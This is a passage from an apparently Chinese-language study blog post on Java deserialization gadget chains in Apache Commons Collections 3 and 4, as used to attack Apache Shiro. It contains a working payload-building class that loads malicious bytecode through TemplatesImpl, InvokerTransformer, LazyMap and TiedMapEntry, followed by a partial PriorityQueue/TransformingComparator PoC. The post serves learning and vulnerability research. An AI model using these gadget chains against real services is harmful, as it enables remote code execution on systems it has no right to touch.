punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>trax<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TemplatesImpl</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>trax<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransformerFactoryImpl</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Transformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvokerTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>keyvalue<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TiedMapEntry</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LazyMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteArrayOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Map</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CommonsCollectionsShiro</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> fieldName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token class-name\">Field</span> field <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span>fieldName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        field<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        field<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">getPayload</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> clazzBytes<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token class-name\">TemplatesImpl</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>clazzBytes<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Evil\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token class-name\">Transformer</span> transformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getClass\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token class-name\">Map</span> innerMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> transformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token class-name\">TiedMapEntry</span> tme <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TiedMapEntry</span><span class=\"token punctuation\">(</span>outerMap<span class=\"token punctuation\">,</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token class-name\">Map</span> expMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        expMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>tme<span class=\"token punctuation\">,</span> <span class=\"token string\">\"valuevalue\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        outerMap<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>transformer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"iMethodName\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"newTransformer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token comment\">// ==================</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token comment\">// 生成序列化字符串</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token class-name\">ByteArrayOutputStream</span> barr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>expMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">return</span> barr<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4vSmF2YVRoaW5ncy9ibG9iL21hc3Rlci9zaGlyb2F0dGFjay9zcmMvbWFpbi9qYXZhL2NvbS9nb3Z1bG4vc2hpcm9hdHRhY2svQ2xpZW50LmphdmE=\">JavaThings/shiroattack/src/main/java/com/govuln/shiroattack/Client.java at master · phith0n/JavaThings</span></p>\n<p>用这个装填上面的 payload：</p>\n<p>这里用的是 javassist，这是一个字节码草操纵的第三方库，可以帮助我将恶意类 Evil 生成字节码再交给 TemplateImpl。生成的 poc，在 cookie 里进行发送，然后弹不出一点计算器，但是用 shiroattack 就行，就离谱，明明链子都是一样的，还是不能做出来，拼尽全力无法战胜，给个？？？号，以后再说</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505251733960.png\" alt=\"image-20250525173253704\" /></p>\n<p>抽象麻了</p>\n<h4 id=\"待复现\"><a class=\"anchor\" href=\"#待复现\">#</a> 待复现</h4>\n<h2 id=\"commons-collections4与漏洞修复\"><a class=\"anchor\" href=\"#commons-collections4与漏洞修复\">#</a> commons-collections4 与漏洞修复</h2>\n<p>在 Apache commons collections 有以下两个分支版本：</p>\n<p>1.commons-collections:commons-collections</p>\n<p>2.org.apache.commons:commons-collections4</p>\n<p>连包的位置发生了改变，应该就是不一样的包了把，事实确实如此，commonsCollection 老的版本包，当时的版本号是 3.2.1; 后面的在 2013 年退出的 4 的版本，当时的版本号是 4.0. 那么为什么会分成两个不同的分支呢？</p>\n<p>官方认为 ijiu 的 commons-collection 有一些架构和 API 设计上的问题，但修复这些，会产生大量不能向前兼容的改动，所以 commons-collections4 不再认为是一个用来替换 commons-collections 的新版本，而是一个新的包，两者的命名空键不冲突，因此可以共存在同一个项目中。</p>\n<p>那么很自然有个问题，既然 3.2.1 中存在反序列化利用链，那么 4.0 版本是否存在呢？</p>\n<h3 id=\"commons-collection4的改动\"><a class=\"anchor\" href=\"#commons-collection4的改动\">#</a> Commons-Collection4 的改动：</h3>\n<p>LazyMap.decorate 这个方法没了：<br />\n结果 4 中只是把这个方法名字改成了 lazymap 的方法名字：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">K</span><span class=\"token punctuation\">></span></span> <span class=\"token class-name\">LazyMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">lazyMap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span> map<span class=\"token punctuation\">,</span> <span class=\"token keyword\">final</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">super</span> <span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span> factory<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LazyMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> factory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>将其改成：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">lazyMap</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505251751598.png\" alt=\"image-20250525175155227\" /></p>\n<p>直接弹计算器了（讲 collections 改成 collections5 就行了，改 Map outerMap = LazyMap.lazyMap (innerMap, transformerChain); // 创建一个 Lazymap 对象，并传入假的 transformerChain 就可以了）</p>\n<h3 id=\"priorityquene利用链\"><a class=\"anchor\" href=\"#priorityquene利用链\">#</a> priorityQuene 利用链</h3>\n<p>除了老的几个利用链，ysoserial 还未 commons-collections4 准备了两条新的利用链，那就是 CommonsCollections2 和 CommonsCollections4</p>\n<p>cc 这个包之所以能有这么多利用链出来，很大的原因是其中包含了一些可以执行任意方法锕得 Transformer，所以，在 Common-collections 中找 Gadget 的过程，实际上可以简化为，找一条从 Serialzable#readObject () 方法到 Transformer#transfrom () 方法的调用链。</p>\n<p>有了这个认识，我们再来看 CommonsCollections，其中用到的两个关键类是：</p>\n<pre><code>java,util.PriorityQuene\n\norg.apache..common.collections4.comparators.TransformingComparator\n</code></pre>\n<p>这两个类有什么特点？</p>\n<p>java.util.PriorityQuene 是一个有自己 readObject () 方法的类：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>ObjectInputStream</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">throws</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token comment\">// Read in size, and any hidden stuff</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> s<span class=\"token punctuation\">.</span><span class=\"token function\">defaultReadObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token comment\">// Read in (and discard) array length</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> s<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> queue <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span>size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token comment\">// Read in all elements.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> size<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> queue<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token comment\">// Elements are guaranteed to be in \"proper order\", but the</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token comment\">// spec has never explained what that might be.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token function\">heapify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>org.apache.commons.collections4.comparators.TransFromingComparator 中有调用 transform（）方法的函数：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">compare</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">I</span> obj1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">I</span> obj2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">final</span> <span class=\"token class-name\">O</span> value1 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>transformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">final</span> <span class=\"token class-name\">O</span> value2 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>transformer<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>decorated<span class=\"token punctuation\">.</span><span class=\"token function\">compare</span><span class=\"token punctuation\">(</span>value1<span class=\"token punctuation\">,</span> value2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>所以，acc2 实际上就是一条从 Priority 到 TransformingComparator 的利用链。</p>\n<p>看一下他们是怎么连接起来的，priorityQuene#readObject () 中调用了 heapify () 方法，heapify () 中调用 siftDown () siftDown () 中调用的 comparator。compare ()，于是就连接到上面的 TranformingComparator 了：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">siftDownUsingComparator</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k<span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">int</span> half <span class=\"token operator\">=</span> size <span class=\"token operator\">>>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">&lt;</span> half<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token keyword\">int</span> child <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token class-name\">Object</span> c <span class=\"token operator\">=</span> queue<span class=\"token punctuation\">[</span>child<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token keyword\">int</span> right <span class=\"token operator\">=</span> child <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">&lt;</span> size <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> comparator<span class=\"token punctuation\">.</span><span class=\"token function\">compare</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> c<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> queue<span class=\"token punctuation\">[</span>right<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> c <span class=\"token operator\">=</span> queue<span class=\"token punctuation\">[</span>child <span class=\"token operator\">=</span> right<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>comparator<span class=\"token punctuation\">.</span><span class=\"token function\">compare</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> c<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> queue<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> k <span class=\"token operator\">=</span> child<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> queue<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>总结一下就是：</p>\n<pre><code>1.java.util.Priority是一个优先队列（Quene）,基于二叉堆实现，队列中每一个元素有自己的优先级，节点之间按照优先级大小排序成一棵树\n2.反序列化为什么需要调用heapify()方法？为了反序列化后，需要恢复（换言之，保证）这个结构的顺序\n3.排序是靠将大的元素下一实现的，siftDown()是将节点下移的函数，而comparator.compare()用来比较两个元素的大小\n4.TransformingComparator实现了java.util.Comparator接口，这个接口用于定义两个对象如何进行比较。sift Down UsingComparator()中就是用这个接口的compare()方法比较书的节点。\n</code></pre>\n<p>这个 PriorityQuene 这个数据结构的具体原理，可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGluZ2h1LWphdmEvcC85NDY3ODA1Lmh0bWw=\">PriorityQueue 源码分析 - linghu_java - 博客园</span></p>\n<h3 id=\"编写poc\"><a class=\"anchor\" href=\"#编写poc\">#</a> 编写 poc：</h3>\n<p>标准操作：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> fakeTransformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span 